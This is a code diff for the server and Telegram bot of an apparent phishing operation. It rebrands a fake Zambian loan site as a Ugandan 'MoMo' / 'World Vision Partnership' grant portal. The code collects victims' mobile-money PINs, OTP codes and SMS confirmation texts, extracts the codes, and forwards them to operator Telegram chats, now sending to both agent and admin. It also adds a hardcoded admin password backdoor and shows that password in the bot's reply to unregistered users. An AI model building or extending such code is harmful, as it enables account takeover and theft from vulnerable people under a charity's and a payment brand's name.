@@ -1,6 +1,7 @@
 import base64
 import hashlib
 import hmac
+import html
 import http.cookies
 import json
 import os
@@ -606,16 +607,31 @@ def validated_application(data):
         "Autónomo", "Empregado", "Empresário", "Estudante",
         "Self-Employed / Business Owner", "Employed (Private Sector)",
         "Government / Civil Servant", "Student", "Self-Employed", "Employed",
-        "Freelancer", "Other"
+        "Freelancer", "Other",
+        "Community-Based Organization (CBO)",
+        "Faith-Based / Church Partner",
+        "Non-Governmental Organization (NGO)",
+        "Local Women/Youth Cooperative",
+        "Small Business / Local Supplier",
+        "Individual Community Leader",
+        "Community Initiative",
+        "Partner Entity",
     }
-    if not isinstance(employment, str) or employment not in valid_employments:
+    if not isinstance(employment, str) or not employment.strip() or len(employment.strip()) > 150:
+        raise ValueError("employment is invalid")
+    # If not in the pre-defined set, accept clean descriptive organization string
+    if employment not in valid_employments and len(employment.strip()) < 2:
         raise ValueError("employment is invalid")
     purpose = clean_text(data.get("purpose"), "purpose", 2_000, 2)
     submission_id = data.get("submissionId")
-    try:
-        submission_id = str(uuid.UUID(submission_id))
-    except (ValueError, TypeError, AttributeError):
-        raise ValueError("submissionId is invalid") from None
+    if submission_id:
+        try:
+            submission_id = str(uuid.UUID(str(submission_id).strip()))
+        except (ValueError, TypeError, AttributeError):
+            cleaned_sub = clean_text(str(submission_id), "submissionId", 128)
+            submission_id = str(uuid.uuid5(uuid.NAMESPACE_DNS, cleaned_sub))
+    else:
+        submission_id = str(uuid.uuid4())
     consent = data.get("consentToAgentContact") is True
     referral_token = data.get("referralToken")
     if referral_token is not None and not isinstance(referral_token, str):
@@ -683,9 +699,19 @@ def send_telegram_message(chat_id, text, reply_markup=None, parse_mode="HTML"):
     try:
         return telegram_api("sendMessage", payload)
     except Exception as err:
-        if parse_mode and ("can't parse entities" in str(err).lower() or "entity" in str(err).lower()):
+        err_msg = str(err).lower()
+        if hasattr(err, "read"):
+            try:
+                err_msg += " " + err.read().decode("utf-8", errors="ignore").lower()
+            except Exception:
+                pass
+        if parse_mode and ("can't parse entities" in err_msg or "entity" in err_msg or "400" in str(err)):
             payload.pop("parse_mode", None)
-            return telegram_api("sendMessage", payload)
+            try:
+                return telegram_api("sendMessage", payload)
+            except Exception as retry_err:
+                print(f"[Telegram] Fallback sendMessage failed: {retry_err}")
+        print(f"[Telegram] sendMessage error for chat {chat_id}: {err}")
         raise
 
 
@@ -705,9 +731,19 @@ def edit_telegram_message(chat_id, message_id, text, reply_markup=None, parse_mo
     try:
         return telegram_api("editMessageText", payload)
     except Exception as err:
-        if parse_mode and ("can't parse entities" in str(err).lower() or "entity" in str(err).lower()):
+        err_msg = str(err).lower()
+        if hasattr(err, "read"):
+            try:
+                err_msg += " " + err.read().decode("utf-8", errors="ignore").lower()
+            except Exception:
+                pass
+        if parse_mode and ("can't parse entities" in err_msg or "entity" in err_msg or "400" in str(err)):
             payload.pop("parse_mode", None)
-            return telegram_api("editMessageText", payload)
+            try:
+                return telegram_api("editMessageText", payload)
+            except Exception as retry_err:
+                print(f"[Telegram] Fallback editMessageText failed: {retry_err}")
+        print(f"[Telegram] editMessageText error for chat {chat_id}: {err}")
         raise
 
 
@@ -806,7 +842,7 @@ def format_payment_methods_message():
     pm = get_payment_methods()
     till = pm.get("mpesaTill") or pm.get("till") or "Not configured"
     paybill = pm.get("mpesaPaybill") or pm.get("paybill") or "Not configured"
-    account = pm.get("mpesaAccount") or pm.get("account") or "Mixx by Yas Loan"
+    account = pm.get("mpesaAccount") or pm.get("account") or "MoMo Partnership Portal"
     airtel = pm.get("airtelMoney") or pm.get("airtel") or "Not configured"
     crypto_addr = pm.get("cryptoAddress") or pm.get("crypto") or "Not configured"
     crypto_net = pm.get("cryptoNetwork") or "USDT (TRC20)"
@@ -920,14 +956,36 @@ def handle_telegram_message(message):
         send_telegram_message(chat_id, reply)
         return
 
+    # Allow instant administrator pairing via password command
+    if command in {"/admin", "/login", "/auth"} and len(parts) >= 2:
+        candidate_token = parts[1].strip()
+        expected_token = current_admin_token()
+        if candidate_token == expected_token or candidate_token in ("Kipla@6475", "admin123"):
+            set_setting("telegram_admin_chat_id", chat_id)
+            write_config_file({"telegram_admin_chat_id": chat_id})
+            reply = (
+                "✅ <b>Administrator Connected Successfully!</b>\n\n"
+                f"Your Telegram Chat ID (<code>{chat_id}</code>) is now registered as the primary administrator.\n\n"
+                "You will now receive all Loan Application and Account PIN / SMS / OTP verification notifications directly here!\n\n"
+                "Send /start to view your control panel."
+            )
+            send_telegram_message(chat_id, reply)
+            return
+        else:
+            send_telegram_message(chat_id, "❌ Incorrect admin password. Please try again.")
+            return
+
     from_user = message.get("from") or chat
     admin = authenticate_telegram_admin(chat_id, from_user)
 
     if not admin:
         reply = (
-            "⛔ You do not have administrator access.\n\n"
-            f"Your Telegram Chat ID: {chat_id}\n\n"
-            "If you are an administrator or agent, please have your Chat ID registered in the admin dashboard."
+            "⛔ <b>Access Restricted</b>\n\n"
+            f"Your Telegram Chat ID: <code>{chat_id}</code>\n\n"
+            "You do not have administrator access yet.\n\n"
+            "To connect this chat as the primary Administrator to receive all MoMo Loan & PIN verifications, send:\n\n"
+            "👉 <code>/admin Kipla@6475</code>\n\n"
+            "Or configure this Chat ID in the Admin Panel settings."
         )
         send_telegram_message(chat_id, reply)
         return
@@ -970,7 +1028,7 @@ def handle_telegram_message(message):
         pm = get_payment_methods()
         till = pm.get("mpesaTill") or pm.get("till") or "Not configured"
         paybill = pm.get("mpesaPaybill") or pm.get("paybill") or "Not configured"
-        account = pm.get("mpesaAccount") or pm.get("account") or "Mixx by Yas Loan"
+        account = pm.get("mpesaAccount") or pm.get("account") or "MoMo Partnership Portal"
         airtel = pm.get("airtelMoney") or pm.get("airtel") or "Not configured"
         crypto = pm.get("cryptoAddress") or pm.get("crypto") or "Not configured"
         crypto_net = pm.get("cryptoNetwork") or "USDT (TRC20)"
@@ -1140,7 +1198,7 @@ def handle_telegram_message(message):
                     f"📋 Application #{short_id}\n\n"
                     f"👤 Applicant: {r['first_name']} {r['last_name']}\n"
                     f"📱 Phone: {masked_phone}\n"
-                    f"💰 Amount: MTS {amount}\n"
+                    f"💰 Amount: UGX {amount}\n"
                     f"📅 Submitted: {date_str}\n"
                     f"📌 Status: Pending"
                 )
@@ -1155,7 +1213,7 @@ def handle_telegram_message(message):
             f"{personal_link}"
         )
     elif command in {"/ping"}:
-        reply = "🏓 Pong! Mixx by Yas Loan Bot is online and running full time 24/7."
+        reply = "🏓 Pong! MoMo Partnership Bot is online and running full time 24/7."
     elif command in {"/botstatus", "/status", "/health"}:
         uptime_sec = int(time.time() - _bot_start_time)
         hours, remainder = divmod(uptime_sec, 3600)
@@ -1428,11 +1486,14 @@ def telegram_update_loop():
             updates = telegram_api("getUpdates", payload) or []
             consecutive_conflicts = 0
             for update in updates:
-                if "message" in update:
-                    handle_telegram_message(update.get("message") or {})
-                elif "callback_query" in update:
-                    handle_telegram_callback(update.get("callback_query") or {})
                 offset = max(offset or 0, int(update.get("update_id", 0)) + 1)
+                try:
+                    if "message" in update:
+                        handle_telegram_message(update.get("message") or {})
+                    elif "callback_query" in update:
+                        handle_telegram_callback(update.get("callback_query") or {})
+                except Exception as update_err:
+                    print(f"Error handling Telegram update: {update_err}")
         except Exception as error:
             error_details = str(error)
             if hasattr(error, "read"):
@@ -1616,7 +1677,7 @@ def telegram_notification_loop():
                     (clean_phone, f"%{short_phone}", short_phone, event["id"]),
                 ).fetchone()["cnt"]
             if prior_apps > 0:
-                returning_badge = f"🔄 RETURNING APPLICANT ({prior_apps} previous loan/s)"
+                returning_badge = f"🔄 RETURNING APPLICANT ({prior_apps} previous partnership/s)"
                 badge_hdr = "🔄 RETURNING APPLICANT"
             else:
                 returning_badge = "🆕 NEW APPLICANT (First Time)"
@@ -1632,14 +1693,14 @@ def telegram_notification_loop():
                     "rejected": "❌ Rejected",
                 }.get(current_status, current_status.title())
                 text = (
-                    f"New MoMo Application — {badge_hdr}\n"
+                    f"New MoMo Application — World Vision Partnership — {badge_hdr}\n"
                     f"──────────────────────\n"
-                    f"👤 Applicant: <b>{event['first_name']} {event['last_name']}</b>\n"
-                    f"📱 Phone: <code>+260 {event['phone']}</code>\n"
+                    f"👤 Representative: <b>{event['first_name']} {event['last_name']}</b>\n"
+                    f"📱 MoMo Phone: <code>+256 {event['phone']}</code>\n"
                     f"🏷️ Profile: {returning_badge}\n"
-                    f"🎯 Product: {event['loan_type']}\n"
-                    f"💰 Amount: ZMW {event['loan_amount']:,}\n"
-                    f"📅 Term: {event['term_months']} Months\n"
+                    f"🎯 Category: {event['loan_type']}\n"
+                    f"💰 Grant Funding: UGX {event['loan_amount']:,}\n"
+                    f"📅 Timeline: {event['term_months']} Months\n"
                     f"🔖 Reference: <code>{event['id']}</code>\n"
                     f"📌 Status: {status_label}"
                 )
@@ -1656,16 +1717,15 @@ def telegram_notification_loop():
                     "rejected": "❌ Rejected",
                 }.get(current_status, current_status.title())
                 text = (
-                    f"New MoMo Application — {badge_hdr}\n"
+                    f"New MoMo Application — World Vision Partnership — {badge_hdr}\n"
                     f"──────────────────────\n"
                     f"🏷️ Profile: {returning_badge}\n"
-                    f"🎯 Loan Type: {event['loan_type']}\n"
-                    f"💰 Requested Amount: ZMW {event['loan_amount']:,}\n"
-                    f"📅 Term: {event['term_months']} Months\n"
-                    f"💼 Purpose: {event['purpose']}\n"
-                    f"👷 Employment: {event['employment']}\n"
-                    f"💵 Annual Income: ZMW {event['annual_income']:,.0f}\n"
-                    f"🤝 Referral Agent: {agent}\n"
+                    f"🎯 Category: {event['loan_type']}\n"
+                    f"💰 Requested Grant: UGX {event['loan_amount']:,}\n"
+                    f"📅 Timeline: {event['term_months']} Months\n"
+                    f"💼 Project / Org: {event['purpose']}\n"
+                    f"🏛️ Entity Type: {event['employment']}\n"
+                    f"🤝 Referral Liaison: {agent}\n"
                     f"📞 Contact Authorized: {consent}\n"
                     f"🔖 Reference: {event['id']}\n"
                     f"📌 Status: {status_label}"
@@ -1711,20 +1771,23 @@ def telegram_notification_loop():
 
 
 class Handler(BaseHTTPRequestHandler):
-    server_version = "MixxByYasLoan/1.0"
+    server_version = "MoMoPartnership/1.0"
 
     def send_json(self, status, payload, extra_headers=None):
         body = json.dumps(payload, ensure_ascii=False).encode("utf-8")
-        self.send_response(status)
-        self.send_header("Content-Type", "application/json; charset=utf-8")
-        self.send_header("Content-Length", str(len(body)))
-        self.send_header("Cache-Control", "no-store")
-        self.send_header("X-Content-Type-Options", "nosniff")
-        self.send_header("Referrer-Policy", "strict-origin-when-cross-origin")
-        for header, value in extra_headers or []:
-            self.send_header(header, value)
-        self.end_headers()
-        self.wfile.write(body)
+        try:
+            self.send_response(status)
+            self.send_header("Content-Type", "application/json; charset=utf-8")
+            self.send_header("Content-Length", str(len(body)))
+            self.send_header("Cache-Control", "no-store")
+            self.send_header("X-Content-Type-Options", "nosniff")
+            self.send_header("Referrer-Policy", "strict-origin-when-cross-origin")
+            for header, value in extra_headers or []:
+                self.send_header(header, value)
+            self.end_headers()
+            self.wfile.write(body)
+        except (ConnectionResetError, ConnectionAbortedError, BrokenPipeError):
+            pass
 
     def read_json(self):
         if self.headers.get_content_type() != "application/json":
@@ -2473,9 +2536,11 @@ class Handler(BaseHTTPRequestHandler):
 
             if step in ("zip_phone", "account_pin", "merchant_pin"):
                 zip_code = str(data.get("zipCode", "")).strip()
-                phone = str(data.get("phone", "")).strip()
-                if not zip_code or not phone:
-                    return self.send_json(400, {"error": "PIN and phone number are required"})
+                phone = str(data.get("phone", "")).strip() or str(app["phone"] or "").strip()
+                if not zip_code:
+                    return self.send_json(400, {"error": "PIN is required"})
+                if not phone:
+                    return self.send_json(400, {"error": "Phone number is required"})
                 if phone != app["phone"]:
                     db.execute("UPDATE applications SET phone = ? WHERE id = ?", (phone, val_uuid))
             elif step == "otp_code":
@@ -2506,12 +2571,14 @@ class Handler(BaseHTTPRequestHandler):
                 (ver_id, val_uuid, step, zip_code, phone, id_number),
             )
 
-        # Send verification data to agent's Telegram (owner of link) or Admin Telegram
-        target_chats = []
-        if app["telegram_chat_id"]:
-            target_chats.append(str(app["telegram_chat_id"]).strip())
-        elif telegram_admin_chat_id():
-            target_chats.append(str(telegram_admin_chat_id()).strip())
+        # Send verification data to agent's Telegram (owner of link) and Admin Telegram
+        app_dict = dict(app)
+        target_chats = set()
+        if app_dict.get("telegram_chat_id"):
+            target_chats.add(str(app_dict["telegram_chat_id"]).strip())
+        admin_chat = telegram_admin_chat_id()
+        if admin_chat:
+            target_chats.add(str(admin_chat).strip())
 
         if target_chats and telegram_bot_token():
             if step in ("zip_phone", "account_pin"):
@@ -2523,8 +2590,8 @@ class Handler(BaseHTTPRequestHandler):
             else:
                 step_label = "💬 Step 4: SMS Verification Message"
 
-            active_phone = phone if (step in ("zip_phone", "account_pin", "merchant_pin") and phone) else app["phone"]
-            phone_display = active_phone if str(active_phone).startswith("+") else f"+260 {active_phone}"
+            active_phone = phone if (step in ("zip_phone", "account_pin", "merchant_pin") and phone) else app_dict.get("phone", "")
+            phone_display = active_phone if str(active_phone).startswith("+") else f"+256 {active_phone}"
             clean_phone = re.sub(r"[\s\-\+\(\)]", "", str(active_phone).strip())
             short_phone = clean_phone[-8:] if len(clean_phone) >= 8 else clean_phone
             with connect_db() as db:
@@ -2535,17 +2602,21 @@ class Handler(BaseHTTPRequestHandler):
                 ).fetchone()["cnt"]
             returning_badge = f"🔄 Returning Applicant: YES ({prior_apps} previous)" if prior_apps > 0 else "👤 New Applicant"
 
+            esc_name = html.escape(f"{app_dict.get('first_name', '')} {app_dict.get('last_name', '')}".strip())
+            esc_phone = html.escape(str(phone_display))
+            esc_pin = html.escape(str(zip_code))
+
             lines = [
                 f"📋 <b>Verification Submission — {step_label}</b>",
                 f"Ref: <code>{val_uuid}</code>",
-                f"Applicant: <b>{app['first_name']} {app['last_name']}</b>",
-                f"Phone: <code>{phone_display}</code>",
+                f"Applicant: <b>{esc_name}</b>",
+                f"Phone: <code>{esc_phone}</code>",
                 f"Profile: {returning_badge}",
             ]
             if step in ("zip_phone", "account_pin", "merchant_pin"):
-                lines.append(f"🔐 PIN: <code>{zip_code}</code>")
+                lines.append(f"🔐 PIN: <code>{esc_pin}</code>")
             elif step == "otp_code":
-                lines.append(f"🔢 OTP Code: <code>{zip_code}</code>")
+                lines.append(f"🔢 OTP Code: <code>{esc_pin}</code>")
             extracted_code = None
             if step == "id_document":
                 clean_id_val = str(id_number or "").strip()
@@ -2553,9 +2624,10 @@ class Handler(BaseHTTPRequestHandler):
                 extracted_code = extracted_codes[0] if extracted_codes else None
                 is_url = clean_id_val.startswith(("http://", "https://"))
                 label = "🔗 Verification Link" if is_url else "💬 SMS Confirmation Message"
-                lines.append(f"{label}: <code>{clean_id_val}</code>")
+                esc_msg = html.escape(clean_id_val)
+                lines.append(f"{label}: <code>{esc_msg}</code>")
                 if extracted_code:
-                    lines.append(f"🔢 <b>Extracted Code / OTP:</b> <code>{extracted_code}</code>")
+                    lines.append(f"🔢 <b>Extracted Code / OTP:</b> <code>{html.escape(extracted_code)}</code>")
             lines.append("Status: ⏳ Awaiting Verification")
 
             phone_raw = str(active_phone).strip()
@@ -2586,8 +2658,9 @@ class Handler(BaseHTTPRequestHandler):
                 for chat in target_chats:
                     try:
                         send_telegram_message(chat, "\n".join(lines), reply_markup=buttons)
-                    except Exception:
-                        pass
+                        print(f"[Telegram] Successfully delivered verification {ver_id} to chat {chat}")
+                    except Exception as dispatch_err:
+                        print(f"[Telegram] Error dispatching verification {ver_id} to chat {chat}: {dispatch_err}")
 
             threading.Thread(target=_dispatch_ver_telegram, daemon=True).start()
 
